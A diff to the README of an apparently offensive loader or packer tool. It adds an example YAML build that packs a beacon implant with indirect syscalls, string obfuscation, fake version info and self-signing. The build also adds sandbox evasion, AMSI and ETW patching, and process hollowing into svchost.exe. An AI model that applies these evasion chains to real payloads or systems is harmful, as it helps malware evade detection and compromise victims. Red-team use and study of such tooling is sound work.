@@ -30,24 +30,48 @@ Windows host. See [`docs/`](docs/) for the full Docker details.
 
 ## Build a payload
 
-A build is one YAML document: `build.payloads` maps name → your binary,
-`build.output.path` is where the packed PE lands, and the `runtime` list is the
-ordered chain of techniques:
+A build is one YAML document. `build.payloads` maps a name to your binary,
+`build.stub` holds loader-wide settings (the syscall layer, string obfuscation),
+`build.output` places the artifact and can embed resources and sign it, and the
+top-level `runtime` list is the ordered chain the stub walks — preparation
+techniques first, then the execution technique that runs the payload:
 
 ```yaml
 schema: 6
-name: my-build
+name: demo
 
 build:
+  # Named payloads
   payloads:
-    payload:
-      source: ./my_payload.exe   # local path, or file:// / http(s)://
+    implant:
+      source: ./beacon.exe          
+  # Loader
+  stub:
+    syscalls: 
+      mode: indirect
+      resolver: tartarus_gate 
+    strings: 
+      strategy: xor
+      key: random 
   output:
-    path: ./dist/my_payload_packed.exe
+    path: ./dist/beacon_packed.exe
+    resources:
+      icon: ./examples/assets/sample.ico
+      version_info: 
+        randomize: true                  # Fake Company, ProductName, Version...etc
+    sign: { mode: lab }                  # Create CA and sign the binary
 
+# One ordered chain: preparations run first, then the payload.
 runtime:
-  - technique: process_hollowing
+  - technique: bouncer                   # stay dormant off-target / in a sandbox
+    params: { not_in_sandbox: true, min_ram_mb: 2048, on_fail: silent }
+
+  - technique: patch_amsi                # neutralize AMSI in the loader's process
+  - technique: patch_etw                 # and ETW, before anything runs
+
+  - technique: process_hollowing         # run the PE inside a signed host process
     params:
+      payload: implant
       target: "C:\\Windows\\System32\\svchost.exe"
 ```
 
